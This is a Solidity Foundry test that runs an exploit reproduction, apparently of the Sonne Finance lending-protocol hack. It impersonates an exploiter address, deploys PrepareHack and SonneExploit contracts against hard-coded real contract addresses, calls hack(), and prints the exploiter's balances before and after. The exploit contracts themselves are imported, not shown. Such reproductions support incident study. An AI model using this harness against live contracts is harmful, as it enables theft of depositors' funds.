// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {PrepareHack, SonneExploit} from "../src/Exploit.sol";
import {CToken} from "lending-protocol/CToken.sol";
import {CErc20} from "lending-protocol/CErc20.sol";
import {Comptroller} from "lending-protocol/Comptroller.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "./../src/interfaces/IUniversalRouter.sol";

contract ExploitTest is Test {
    address exploiter = address(0x1337133713371337);
    address veloPool = 0x8134A2fDC127549480865fB8E5A9E8A8a95a54c5;
    address veloToken = 0x9560e827aF36c94D2Ac33a39bCE1Fe78631088Db;
    address unitroller = 0x60CF091cD3f50420d50fD7f707414d0DF4751C58;
    address soVelo = 0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5;
    address timeLock = 0x37fF10390F22fABDc2137E428A6E6965960D60b6;
    address uniRouter = 0xCb1355ff08Ab38bBCE60111F1bb2B784bE25D7e8;
    address WETH = address(0x4200000000000000000000000000000000000006);

    function setUp() public {
    }

    function test_Hack() public {
        vm.deal(exploiter, 1 ether);
        vm.startPrank(exploiter);

        console.log("[-------- Balances before --------]");
        printBalances();

        PrepareHack preExploit = new PrepareHack{value: 0.2 ether}(soVelo, unitroller, payable(timeLock), veloToken, uniRouter);
        SonneExploit exploit = new SonneExploit(veloPool, veloToken, unitroller, soVelo);
        CToken(soVelo).transfer(address(exploit), 2);

        exploit.hack();

        console.log("[-------- Balances after --------]");
        printBalances();

        vm.stopPrank();
    }

    function printBalances() public {
        IERC20 underlying;
        CToken[] memory allMarkets = Comptroller(unitroller).getAllMarkets();
        for(uint i; i < allMarkets.length; i++) {
            underlying = IERC20(CErc20(address(allMarkets[i])).underlying());
            console.log("-- [+] Exploiter balance = ", underlying.balanceOf(address(exploiter)) / uint256(10 ** ERC20(address(underlying)).decimals()), ERC20(address(underlying)).symbol());
        }
    }
}
